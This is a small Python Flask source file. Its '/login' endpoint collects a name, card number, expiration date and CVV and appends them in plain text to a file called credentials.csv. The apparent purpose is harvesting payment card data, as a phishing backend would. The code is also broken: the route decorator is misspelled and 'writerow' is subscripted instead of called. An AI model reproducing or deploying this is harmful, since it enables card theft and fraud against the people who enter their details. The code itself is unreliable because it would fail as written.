from flask import Flask,url_for,jsonify,redirect,request,render_template
import time
import csv

app = Flask(__name__)

@app.route('/')
def index():
   return  render_template('index.html')

@app.route('/login',method=['POSt'])
def login():
   name = request.json.get('name')
   cardnumber = request.json.get('cardnumber')
   expiration_date = request.json.get('expiration_date')
   cvv_number = request.json.get('cvv_number')
   with open('credentials.csv','a+') as f:
      csv_writer = csv.writer(f)
      csv_writer.writerow[name,cardnumber,expiration_date,cvv_number]
   return jsonify({
       'status': 'success'
   }),201



if __name__ == "__main__":
     app.run(debug= True)

